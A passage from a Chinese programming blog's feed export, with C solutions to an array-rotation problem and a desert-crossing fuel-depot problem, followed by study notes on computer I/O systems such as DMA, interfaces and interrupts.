class="language-c"><span class="token comment">//欧几里得算法求最大公约数</span><span class="token keyword">int</span> <span class="token function">euclid</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token punctuation">;</span>        a <span class="token operator">=</span> b<span class="token punctuation">;</span>        b <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> Q <span class="token operator">=</span> <span class="token function">euclid</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//外层循环记录轮数，最大为Q轮</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> q <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> q <span class="token operator">&lt;</span> Q<span class="token punctuation">;</span> <span class="token operator">++</span>q<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> a<span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> q<span class="token punctuation">,</span> s<span class="token punctuation">;</span>        <span class="token comment">//内层循环找到移动元素的最终位置，并放入，将该位置的原元素取出到中间变量</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">/</span> Q<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            m <span class="token operator">=</span> <span class="token punctuation">(</span>m <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">;</span>            s <span class="token operator">=</span> a<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">;</span>            a<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>            temp <span class="token operator">=</span> s<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"After moving: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input the number of the array: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input k: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">move</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> k<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="改进算法"><a href="#改进算法" class="headerlink" title="改进算法"></a>改进算法</h2><p>从后往前，倒推。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> Q <span class="token operator">=</span> <span class="token function">euclid</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> q <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> q <span class="token operator">&lt;</span> Q<span class="token punctuation">;</span> <span class="token operator">++</span>q<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">/</span> Q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">=</span> q<span class="token punctuation">,</span> p1 <span class="token operator">=</span> <span class="token punctuation">(</span>m <span class="token operator">+</span> i <span class="token operator">*</span> k<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">,</span> temp <span class="token operator">=</span> a<span class="token punctuation">[</span>p1<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> p2 <span class="token operator">=</span> <span class="token punctuation">(</span>m <span class="token operator">+</span> i <span class="token operator">*</span> k<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">;</span>            a<span class="token punctuation">[</span>p1<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>p2<span class="token punctuation">]</span><span class="token punctuation">;</span>            p1 <span class="token operator">=</span> p2<span class="token punctuation">;</span>            a<span class="token punctuation">[</span>p2<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"After moving: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穿越沙漠问题求解</title>
      <link href="2020/04/13/chuan-yue-sha-mo-wen-ti-qiu-jie/"/>
      <url>2020/04/13/chuan-yue-sha-mo-wen-ti-qiu-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>一辆吉普车来到1000km宽的沙漠边沿。吉普车的耗油量为1L／km，最大装油量为500L。显然，吉普车必须用自身油箱中的油在沙漠中设几个临时加油点，否则是通不过沙漠的。假设在沙漠边沿有充足的汽油可供使用，那么吉普车应在哪些地方、建多大的临的加油点，才能以最少的油耗穿过这块沙漠？给出每个加油点的位置及该加油点的存油量。</p><span id="more"></span><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><ol><li>吉普车最大装油量为500L，显然一次不够穿过沙漠</li><li>正推基本不可能，我们可以尝试倒退法：最后一个加油站我们记为1号加油站，要使耗油量最小，那么吉普车到这个加油站时刚好耗完油，在这里加满油后直接到达终点，且到达终点刚好耗尽油，即1号加油站有500L油</li><li>要使1号加油站有500L油，就要从2号往1号送油。一次显然不能使1号500L（吉普车最大才能装500L，路上还要消耗一部分），所以要在每两个加油站之间来回跑，且至少跑三次（2-&gt;1, 1-&gt;2, 2-&gt;1）</li><li>要使耗油量最小，那么就要使每次从一个加油站出发时，正好加满油；每次回到这个加油站时，正好耗尽油。因此可以推出，<strong>每个加油站的存油量应为500的整数倍</strong>（500，1000，1500，…）</li><li>2号加油站到1号加油站，设距离为dis，那么至少走三个dis，且要保证耗油最少，来回只能用500L，并且保证最终1号有500L，可以得出dis=500/3</li><li>同理，3号到2号，要保证2号有1000L，那么dis=500/5</li><li>推理可知，$dis=500/(2\times n-1)$</li><li>不断迭代，可以求出各个加油站距离终点的距离以及存油量。最后一个（正推的第一个）可能在起点之前。</li></ol><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">float</span> dis<span class="token punctuation">,</span> <span class="token keyword">int</span> oil<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d, %.2f, %d\n"</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> dis<span class="token punctuation">,</span> oil<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">cross</span><span class="token punctuation">(</span><span class="token keyword">float</span> distance<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">float</span> dis <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> oil <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>dis <span class="token operator">&lt;</span> distance<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">output</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> dis<span class="token punctuation">,</span> oil<span class="token punctuation">)</span><span class="token punctuation">;</span>        n <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        oil <span class="token operator">=</span> <span class="token number">500</span> <span class="token operator">*</span> n<span class="token punctuation">;</span>        dis <span class="token operator">+=</span> <span class="token number">500.0</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    dis <span class="token operator">=</span> distance <span class="token operator">-</span> <span class="token punctuation">(</span>dis <span class="token operator">-</span> <span class="token number">500.0</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    oil <span class="token operator">=</span> oil <span class="token operator">-</span> <span class="token number">500</span> <span class="token operator">+</span> dis <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">output</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> dis<span class="token punctuation">,</span> oil<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">float</span> distance<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input distance: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%f"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>distance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cross</span><span class="token punctuation">(</span>distance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理之输入输出系统</title>
      <link href="2020/04/06/ji-suan-ji-zu-cheng-yuan-li-zhi-shu-ru-shu-chu-xi-tong/"/>
      <url>2020/04/06/ji-suan-ji-zu-cheng-yuan-li-zhi-shu-ru-shu-chu-xi-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="英文缩写的中文含义"><a href="#英文缩写的中文含义" class="headerlink" title="英文缩写的中文含义"></a>英文缩写的中文含义</h1><ul><li>DMA：内存直接访问</li><li>DBR：接口内的数据缓冲寄存器</li><li>INTR：接口内的中断请求触发器</li><li>MASK：接口内的屏蔽触发器</li><li>SEL：Select，设备选择电路发出的选择信号</li><li>EINT：允许中断触发器</li><li>AR：地址寄存器</li><li>WC：字计数器</li><li>DAR：设备地址寄存器</li><li>HRQ：DMA控制逻辑向CPU发出的总线使用请求信号</li><li>HLDA：CPU给DMA控制逻辑的应答信号</li><li>DACK：DMA控制逻辑对设备给出的应答信号</li><li>DREQ：外部设备向DMA控制逻辑发出的请求信号</li><li>BR：数据缓冲器</li></ul><h1 id="输入输出系统的发展概况"><a href="#输入输出系统的发展概况" class="headerlink" title="输入输出系统的发展概况"></a>输入输出系统的发展概况</h1><h2 id="1-早期阶段"><a href="#1-早期阶段" class="headerlink" title="1. 早期阶段"></a>1. 早期阶段</h2><ul><li>早期I/O设备种类较少，I/O设备与主机交换信息都必须通过CPU；</li><li><strong>分散连接</strong></li><li>CPU与I/O<strong>串行</strong>工作，使用<strong>程序查询方式</strong>传送信息</li></ul><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid">graph LRA[存储器]--&gt;CPUCPU--&gt;B1[I/O1]B1--&gt;CPUCPU--&gt;ACPU--&gt;B2[I/O2]B2--&gt;CPUCPU--&gt;B3[....]B3--&gt;CPUCPU--&gt;B4[I/On]B4--&gt;CPU<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-接口模块和DMA阶段"><a href="#2-接口模块和DMA阶段" class="headerlink" title="2. 接口模块和DMA阶段"></a>2. 接口模块和DMA阶段</h2><ul><li>IO设备通过<strong>接口模块</strong>与主机连接，采用总线结构（接口见后面）</li><li>CPU与IO设备并行工作，有中断方式和DMA方式</li><li>缺点：增加了硬件成本，使控制变得十分复杂；对众多的DMA进行管理，会占用CPU的工作时间，直接影响CPU的整体工作效率。</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTEzMDUwNGY0YmNiMDQ1YWIwZTkucG5n?x-oss-process=image/format,png"></p><h2 id="3-具有通道结构的阶段"><a href="#3-具有通道结构的阶段" class="headerlink" title="3. 具有通道结构的阶段"></a>3. 具有通道结构的阶段</h2><ul><li>适用于大、中型计算机系统</li><li>通道负责管理IO设备以及实现主存与IO设备之间交换信息，能够独立的执行通道指令所编写的输入输出程序</li><li>通道受CPU的IO指令启动、停止或改变其工作状态</li><li>CPU不直接参与管理IO设备，故CPU的资源利用率更高</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE1YTUwNGY0YmNiMDQ1YWU5NDUucG5n?x-oss-process=image/format,png"></p><h2 id="4-具有I-O处理机的阶段"><a href="#4-具有I-O处理机的阶段" class="headerlink" title="4. 具有I/O处理机的阶段"></a>4. 具有I/O处理机的阶段</h2><ul><li>IO处理机独立于主机工作，既可完成IO通道对IO的控制，又可以完成码制变换、格式处理、数据块检错、纠错等操作</li><li>与CPU工作的并行性更高</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE2MDUwNGY0YmNiMDQ1YWVmN2YucG5n?x-oss-process=image/format,png"></p><blockquote><p>从早期到I/O处理机时期，外部设备的独立性越来越高。</p></blockquote><h1 id="输入输出系统的组成"><a href="#输入输出系统的组成" class="headerlink" title="输入输出系统的组成"></a>输入输出系统的组成</h1><p>组成：硬件和软件两部分。</p><h2 id="1-软件"><a href="#1-软件" class="headerlink" title="1. 软件"></a>1. 软件</h2><h3 id="1-1-主要任务"><a href="#1-1-主要任务" class="headerlink" title="1.1 主要任务"></a>1.1 主要任务</h3><ul><li>将用户编制的程序或数据输入至主机</li><li>将运算结果输送给用户</li><li>实现I/O系统与主机工作的协调</li></ul><h3 id="1-2-I-O指令"><a href="#1-2-I-O指令" class="headerlink" title="1.2 I/O指令"></a>1.2 I/O指令</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE2NTUwNGY0YmNiMDQ1YWY0ZGYucG5n?x-oss-process=image/format,png"></p><ul><li>操作码：标志位</li><li>命令码：<ul><li>将数据从IO输入主机</li><li>将数据从主机输出IO</li><li>状态测试</li><li>形成某些操作命令</li></ul></li><li>设备码：地址编码</li><li>IO指令是CPU指令的一部分，用来控制外部设备，由CPU译码后执行</li></ul><h3 id="1-3-通道指令"><a href="#1-3-通道指令" class="headerlink" title="1.3 通道指令"></a>1.3 通道指令</h3><ul><li>是对具有通道的IO系统专门设置的指令</li><li>一般用于指明参与传送的数据组的首地址、传送字数、操作命令等</li><li>通道指令是通道用于执行IO操作的指令，可以存放在主存，由通道取出并执行</li><li><strong>通道程序</strong>由通道指令组成，完成某种外围设备与主存传送信息的操作</li></ul><h2 id="2-硬件"><a href="#2-硬件" class="headerlink" title="2. 硬件"></a>2. 硬件</h2><ul><li>设备&lt;——&gt;I/O接口</li><li>设备&lt;——&gt;设备控制器&lt;——&gt;通道</li></ul><h1 id="I-O设备与主机的联系方式"><a href="#I-O设备与主机的联系方式" class="headerlink" title="I/O设备与主机的联系方式"></a>I/O设备与主机的联系方式</h1><h2 id="1-I-O编址方式"><a href="#1-I-O编址方式" class="headerlink" title="1. I/O编址方式"></a>1. I/O编址方式</h2><p>通常将IO设备码视为地址码，对IO地址码有两种编址方式</p><ul><li>统一编址：将IO地址看作是存储器地址的一部分</li><li>不统一编址（独立编址）：有专门的IO指令</li></ul><h2 id="2-设备寻址"><a href="#2-设备寻址" class="headerlink" title="2. 设备寻址"></a>2. 设备寻址</h2><p>每台设备都赋予一个设备号，因此可以用I/O指令的设备码字段直接指出该设备的设备号。通过接口电路中的<strong>设备选择电路</strong>，便可选中要交换信息的设备。</p><h2 id="3-传送方式"><a href="#3-传送方式" class="headerlink" title="3. 传送方式"></a>3. 传送方式</h2><ul><li><strong>串行传送</strong>：同一瞬间只传送一位信息</li><li><strong>并行传送</strong>：同一瞬间传送n位信息</li></ul><h2 id="4-联络方式"><a href="#4-联络方式" class="headerlink" title="4. 联络方式"></a>4. 联络方式</h2><p>IO设备与主机之间必须了解彼此当时所处的状态。</p><h3 id="4-1-立即响应方式"><a href="#4-1-立即响应方式" class="headerlink" title="4.1 立即响应方式"></a>4.1 立即响应方式</h3><ul><li>只要CPU的I/O指令一到，I/O设备就立即响应</li><li>无需特殊联络信号</li><li>适用于工作速度缓慢的I/O设备</li></ul><h3 id="4-2-异步工作采用应答信号联络"><a href="#4-2-异步工作采用应答信号联络" class="headerlink" title="4.2 异步工作采用应答信号联络"></a>4.2 异步工作采用应答信号联络</h3><ul><li>在交换信息前，IO与CPU各自完成自身的任务，一旦出现联络信号，彼此才准备交换信息</li><li>适用于IO设备与主机工作速度不匹配的情况</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE2NzUwNGY0YmNiMDQ1YWY3OWQucG5n?x-oss-process=image/format,png"></p><h3 id="4-3-同步工作采用同步时标联络"><a href="#4-3-同步工作采用同步时标联络" class="headerlink" title="4.3 同步工作采用同步时标联络"></a>4.3 同步工作采用同步时标联络</h3><p>要求I/O设备与CPU的工作速度完全同步，这种联络互相之间还得配有专用电路，用以产生<strong>同步时标来控制同步工作</strong>。</p><h2 id="5-I-O与主机的连接方式"><a href="#5-I-O与主机的连接方式" class="headerlink" title="5. I/O与主机的连接方式"></a>5. I/O与主机的连接方式</h2><h3 id="5-1-辐射式连接"><a href="#5-1-辐射式连接" class="headerlink" title="5.1 辐射式连接"></a>5.1 辐射式连接</h3><pre class="line-numbers language-mermaid" data-language="mermaid"><code class="language-mermaid">graph LR;A[主机]--&gt;B[外设1]B--&gt;AA--&gt;C[外设2]C--&gt;AA--&gt;D[外设3]D--&gt;A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>每台设备都配有一套控制线路和一组信号线</li><li>缺点：不便于增删设备</li></ul><h3 id="5-2-总线连接"><a href="#5-2-总线连接" class="headerlink" title="5.2 总线连接"></a>5.2 总线连接</h3><ul><li>便于增删设备</li></ul><h1 id="I-O接口"><a href="#I-O接口" class="headerlink" title="I/O接口"></a>I/O接口</h1><blockquote><p>I/O接口通常是指主机与外部设备之间设置的一个硬件电路及其相应的软件控制。</p><p>它是一组电子电路，由若干专用寄存器和相应的控制逻辑电路构成，是CPU和I/O设备之间交换信息的媒介和桥梁</p></blockquote><h2 id="1-为什么要设置接口"><a href="#1-为什么要设置接口" class="headerlink" title="1. 为什么要设置接口"></a>1. 为什么要设置接口</h2><ul><li>实现设备的选择：设备选择电路</li><li>实现数据缓冲达到速度匹配：DBR</li><li>实现数据串-并格式转换</li><li>实现电平控制</li><li>传送控制命令：命令寄存器、命令译码器</li><li>反映设备的状态（“忙”、“就绪”、“中断请求”）：设备状态标记</li></ul><h2 id="2-接口的功能和组成"><a href="#2-接口的功能和组成" class="headerlink" title="2. 接口的功能和组成"></a>2. 接口的功能和组成</h2><table><thead><tr><th>功能</th><th>组成</th></tr></thead><tbody><tr><td>选址（确认是否为参与的设备）</td><td>设备选择电路</td></tr><tr><td>传送命令（传送主机命令）</td><td>命令寄存器、命令译码器</td></tr><tr><td>传送数据（核心）</td><td>数据缓冲寄存器DBR</td></tr><tr><td>反应设备状态</td><td>设备状态标记</td></tr></tbody></table><p>此外，接口的组成还有：</p><ul><li>完成触发器D（D=1表示工作完成done）</li><li>工作触发器B（B=1表示正在忙busy）</li><li>中断请求触发器INTR</li><li>屏蔽触发器MASK</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE2YTUwNGY0YmNiMDQ1YWZiMzcucG5n?x-oss-process=image/format,png"></p><blockquote><p>接口$\neq$端口：</p><ul><li>接口：指主机与外部设备之间设置的一个硬件电路及其相应的软件控制。</li><li>端口：指接口电路中的一些寄存器，这些寄存器分别用来存放数据信息、控制信息和状态信息，相应的就是数据端口、控制端口和状态端口。</li><li>接口 = 端口 + 相应的控制逻辑</li></ul></blockquote><h1 id="I-O设备与主机信息传送的控制方式"><a href="#I-O设备与主机信息传送的控制方式" class="headerlink" title="I/O设备与主机信息传送的控制方式"></a>I/O设备与主机信息传送的控制方式</h1><h2 id="1-程序查询方式"><a href="#1-程序查询方式" class="headerlink" title="1. 程序查询方式"></a>1. 程序查询方式</h2><p>程序查询方式是由CPU通过程序不断查询IO设备是否已做好准备，从而控制IO与主机交换信息。</p><p>为了正确完成这种查询，通常要执行如下三条指令：</p><ul><li>测试指令：查询设备是否准备就绪</li><li>传送指令：在设备准备就绪时，执行传送指令</li><li>转移指令：若设备未准备就绪，执行转移指令，转职测试指令，继续测试设备状态</li></ul><h3 id="1-1-程序查询流程"><a href="#1-1-程序查询流程" class="headerlink" title="1.1 程序查询流程"></a>1.1 程序查询流程</h3><h4 id="1-1-1-单个设备查询流程"><a href="#1-1-1-单个设备查询流程" class="headerlink" title="1.1.1 单个设备查询流程"></a>1.1.1 单个设备查询流程</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE2ZDUwNGY0YmNiMDQ1YWZlZTYucG5n?x-oss-process=image/format,png"></p><h4 id="1-1-2-多个设备查询流程"><a href="#1-1-2-多个设备查询流程" class="headerlink" title="1.1.2 多个设备查询流程"></a>1.1.2 多个设备查询流程</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTM3MTUwNGY0YmNiMDQ1ZDY5OTgucG5n?x-oss-process=image/format,png"></p><p>按照优先级一一查询，哪个设备准备好了就处理哪个设备。</p><h4 id="1-1-3-程序流程"><a href="#1-1-3-程序流程" class="headerlink" title="1.1.3 程序流程"></a>1.1.3 程序流程</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE3MTUwNGY0YmNiMDQ1YjA0ZjQucG5n?x-oss-process=image/format,png"></p><ul><li>这种方式传送数据要占用CPU中的寄存器，故首先需要将寄存器中的原内容保护起来</li><li>传送的往往是一批数据，因此需要设置计数值</li><li>设置于传送数据在内存缓冲器中的首地址</li></ul><blockquote><p>这种方式下，CPU和IO串行工作，在检查IO状态时，CPU处于“踏步等待”。</p></blockquote><h3 id="1-2-程序查询方式的接口电路"><a href="#1-2-程序查询方式的接口电路" class="headerlink" title="1.2 程序查询方式的接口电路"></a>1.2 程序查询方式的接口电路</h3><p>以输入为例：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE3NDUwNGY0YmNiMDQ1YjBiNDkucG5n?x-oss-process=image/format,png"></p><ol><li>CPU发出启动命令，若设备选择电路发出的SEL为1（选中），则D触发器置0，B触发器置1</li><li>B为1，在忙，启动设备</li><li>设备向DBR中输入数据</li><li>设备输送完数据后，D置1，B置0</li><li>告诉CPU设备准备就绪</li><li>DBR中的数据通过数据线传输到内存中</li></ol><h2 id="2-程序中断方式"><a href="#2-程序中断方式" class="headerlink" title="2. 程序中断方式"></a>2. 程序中断方式</h2><h3 id="2-1-中断的产生"><a href="#2-1-中断的产生" class="headerlink" title="2.1 中断的产生"></a>2.1 中断的产生</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMuZG93bmsuY2MvaXRlbS81ZThhMTE3ODUwNGY0YmNiMDQ1YjEyNWYucG5n?x-oss-process=image/format,png"></p><p>CPU与打印机并行工作，串行传送数据。</p><h3 id="2-2-程序中断方式的接口电路"><a href="#2-2-程序中断方式的接口电路" class="headerlink" title="2.2 程序中断方式的接口电路"></a>2.2 程序中断方式的接口电路</h3><h4 id="2-2-1-中断请求触发器-INTR-和中断屏蔽触发器-MASK"><a href="#2-2-1-中断请求触发器-INTR-和中断屏蔽触发器-MASK" class="headerlink" title="2.2.1 中断请求触发器(INTR)和中断屏蔽触发器(MASK)"></a>2.2.1 